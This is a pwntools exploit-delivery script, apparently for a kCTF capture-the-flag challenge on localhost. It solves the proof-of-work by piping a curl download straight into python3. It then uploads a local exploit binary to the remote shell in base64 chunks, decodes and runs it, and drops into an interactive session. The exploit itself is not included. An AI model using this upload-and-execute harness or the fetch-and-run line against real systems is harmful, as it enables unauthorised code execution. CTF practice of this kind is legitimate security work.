from pwn import *
import base64, subprocess

r = remote("localhost", 31367)

def run(cmd): 
    r.sendlineafter("$ ", cmd) 

# solve the kctf PoW
# context.log_level = 'debug'
r.recvuntil(b'python3 <(curl -sSL https://goo.gle/kctf-pow) solve ')
chal = r.recvline().strip().decode()
sol = subprocess.run(
    ["bash", "-c", f"curl -sSL https://goo.gle/kctf-pow | python3 - solve {chal}"],
    capture_output=True, text=True).stdout.strip()
r.sendlineafter(b"Solution?", sol.encode())

# wait for the guest shell, then stream the binary in
with open("./xpl","rb") as f:
    payload = base64.b64encode(f.read()).decode()

log.info( "Uploading..." ) 

for i in range(0, len(payload), 512):
    cur_pl = payload[i:i+512]
    run(f"echo '{cur_pl}' >> /tmp/b64xpl")
    log.info(f"uploaded {min(i+512,len(payload))}/{len(payload)}")
    
run('base64 -d /tmp/b64xpl > /tmp/xpl')
run('chmod +x /tmp/xpl')
run('/tmp/xpl')

r.interactive()